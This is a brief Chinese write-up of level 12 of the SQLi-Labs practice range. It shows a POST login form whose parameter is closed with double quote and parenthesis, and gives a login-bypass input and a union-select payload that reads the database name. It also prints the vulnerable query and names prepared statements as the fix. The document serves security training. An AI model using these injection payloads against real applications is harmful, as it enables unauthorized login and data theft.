# SQLi-Labs | Less-12 POST 双引号括号 ") 注入
## 一、漏洞简介
POST登录框，参数被 ("$uname") 包裹，闭合为 ")
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-12/
## 三、复现步骤
1. uname输入 admin") --+ 密码随便填，绕过登录
2. 联合查询脱库
## 四、Payload
uname=-1") union select 1,database() --+ & passwd=1
## 五、漏洞原理
后端SQL：`SELECT * FROM users WHERE username=("$uname") AND password=("$passwd")`
## 六、修复方案
预编译查询。
## 七、总结
POST、双引号+括号闭合。